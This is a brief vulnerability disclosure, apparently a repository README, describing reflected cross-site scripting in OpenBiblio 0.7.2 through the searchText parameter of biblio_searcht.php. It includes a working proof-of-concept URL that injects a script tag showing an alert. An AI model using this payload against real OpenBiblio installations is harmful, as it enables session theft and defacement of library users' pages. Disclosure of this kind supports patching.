# openbiblio-xss

Cross-site scripting (XSS) vulnerabilities in OpenBiblio 0.7.2 prior allow remote attackers to inject arbitrary web script or HTML via searcText parameters to "shared/biblio_searcht.php".
```
https://[URL]/library/shared/biblio_searcht.php?tab=opac&sortBy=%27&searchText=<script>alert('a')</script>
```
